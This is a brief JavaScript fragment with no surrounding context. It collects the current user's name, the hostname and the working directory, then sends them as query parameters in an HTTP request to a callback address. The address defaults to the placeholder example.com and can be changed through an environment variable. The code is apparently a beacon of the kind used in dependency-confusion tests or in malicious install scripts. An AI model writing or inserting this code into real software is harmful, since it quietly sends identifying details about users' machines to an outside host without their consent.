const DEFAULT_CALLBACK_BASE='https://example.com/';
const base=process.env.CALLBACK_URL||DEFAULT_CALLBACK_BASE;
const payload={user:os.userInfo().username,host:os.hostname(),cwd:process.cwd()};
const qs=Object.entries(payload).map(([k,v])=>`${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`).join('&');
const url=`${base}?${qs}`;
const client=url.startsWith('https://')?https:http;
const req=client.get(url,()=>{});
